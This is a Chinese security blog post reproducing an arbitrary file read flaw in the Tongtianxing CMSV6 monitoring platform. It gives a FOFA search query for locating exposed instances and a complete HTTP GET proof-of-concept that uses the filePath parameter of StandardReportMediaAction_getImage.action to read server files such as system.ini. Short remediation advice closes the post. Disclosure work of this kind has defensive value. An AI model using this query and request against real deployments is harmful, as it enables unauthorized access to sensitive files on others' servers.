#  【漏洞复现】通天星CMS安全监控云平台任意文件读取漏洞   
Mr.Song  蚁剑安全实验室   2024-03-28 16:56  
  
大家可以把**蚁剑安全实验室**“**设为星标**  
”，这样就可以及时看到我们最新发布的“**漏洞预警**”及“**漏洞复现**”的安全内容啦！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OIzfYbpicRTTtibTBtOKkjs53UR4qqddP0IGQuvibM6XIHpiaIQuhdpeIzXfQibGQIxbemicg9H3YNCpcMtPGvblKDbg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
**免责声明：****该文章仅用于技术讨论与学习。请勿利用文章所提供的相关技术从事非法测试，若利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。**  
  
**一、漏洞描述**  
  
深圳市通天星科技有限公司是一家以从事计算机、通信和其他电子设备制造业为主的企业。通天星车载视频监控平台软件拥有多种语言版本，通天星CMSV6拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队,专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。 此平台存在任意文件读取漏洞，攻击者可通过此漏洞进行   任意文件，获取敏感信息。  
  
**二、漏洞复现**  
  
1、fofa语法查找:  
```
body="./open/webApi.html"||body="/808gps/"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OIzfYbpicRTTr6jRM22iaUnvDUHwAPEgETm0747NxQWzfW3VDVAL3azAiasibAvicNkTp63gfHB6qbAVibP6ICQo4lSw/640?wx_fmt=png&from=appmsg "")  
  
2、平台访问  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OIzfYbpicRTTr6jRM22iaUnvDUHwAPEgETMsHtNCwiavQh62AblkJhqOh5Voe2fvCGBqzL5yggVOJx72Wp3ofibntg/640?wx_fmt=png&from=appmsg "")  
  
3、使用POC进行复现  
```
GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://windows/system.ini&fileOffset=1&fileSize=100 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: language=zh; style=1; EnableAESLogin=0; maintitle=%u4E3B%u52A8%u5B89%u5168%u76D1%u63A7%u4E91%u5E73%u53F0; isPolice=0; JSESSIONID=93EE27F98C1335DED37AF33E45A8D207
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OIzfYbpicRTTr6jRM22iaUnvDUHwAPEgETlewsibSUxICamuTggliaDReA7GbrKRml8aJxP5RaSh2SaRrN2xdvjqSg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OIzfYbpicRTTr6jRM22iaUnvDUHwAPEgET0cGI5bu4ytMQ4ArIbqyU6QIRFozicEFMYlzrjkyMqzKnJHCMzgjB2dQ/640?wx_fmt=png&from=appmsg "")  
  
**三、修复建议**  
  
对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。不提供目录遍历服务等。  
  
